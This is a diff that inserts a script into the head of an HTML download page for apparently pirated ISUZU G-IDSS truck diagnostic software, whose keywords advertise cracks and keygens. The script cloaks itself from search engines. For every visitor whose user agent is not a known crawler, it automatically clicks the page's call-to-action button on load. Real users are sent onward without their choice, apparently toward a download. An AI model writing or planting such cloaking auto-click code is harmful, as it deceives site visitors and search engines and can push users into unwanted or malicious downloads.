@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ISUZU G-IDSS Global Export 08.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download ISUZU G-IDSS Global Export 08.2024 diagnostic software for trucks. Supports multiple languages, unlimited license, and all regions except USA and Canada">
     <meta name="keywords" content="ISUZU G-IDSS Global Export 08.2024, ISUZU G-IDSS 2024, ISUZU G-IDSS download, ISUZU G-IDSS free download, ISUZU G-IDSS diagnostic software, ISUZU G-IDSS diagnostic software download, ISUZU G-IDSS diagnostic software free download, ISUZU G-IDSS diagnostic software crack, ISUZU G-IDSS diagnostic software keygen, ISUZU 2024 diagnostic software, ISUZU G-IDSS multiple language, исузу G-IDSS 2024 скачать бесплатно, исузу диагностическое программное обеспечение, ISUZU диагностическое программное обеспечение, ISUZU G-IDSS 2024 завантажити безкоштовно, безкоштовне завантаження ISUZU G-IDSS, скачать ISUZU G-IDSS">
     <style>
